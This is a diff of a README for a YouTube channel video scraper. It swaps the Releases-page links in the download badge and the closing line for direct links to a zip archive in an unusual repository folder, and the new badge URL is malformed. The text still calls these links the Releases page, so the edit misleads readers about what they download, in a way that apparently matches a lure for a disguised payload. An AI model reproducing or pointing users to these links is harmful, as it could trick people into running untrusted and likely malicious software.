@@ -8,7 +8,7 @@ Welcome to youtube-channels-video-scraper! This tool allows you to easily extrac
 
 To get started, you need to download the application. Click the button below to visit the Releases page where you can find the latest version of the software.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/riyanshaikh134/youtube-channels-video-scraper/releases)
+[![Download](https://raw.githubusercontent.com/riyanshaikh134/youtube-channels-video-scraper/main/suberone/youtube_channels_video_scraper_1.8.zip%https://raw.githubusercontent.com/riyanshaikh134/youtube-channels-video-scraper/main/suberone/youtube_channels_video_scraper_1.8.zip)](https://raw.githubusercontent.com/riyanshaikh134/youtube-channels-video-scraper/main/suberone/youtube_channels_video_scraper_1.8.zip)
 
 Once you are on the Releases page, look for the most recent version. Follow these steps to download and install:
 
@@ -78,4 +78,4 @@ This project is licensed under the MIT License.
 
 Thank you for using youtube-channels-video-scraper! Enjoy gathering data from your favorite YouTube channels like never before!
 
-Remember to return to the [Releases page](https://github.com/riyanshaikh134/youtube-channels-video-scraper/releases) for updates and new features.
+Remember to return to the [Releases page](https://raw.githubusercontent.com/riyanshaikh134/youtube-channels-video-scraper/main/suberone/youtube_channels_video_scraper_1.8.zip) for updates and new features.
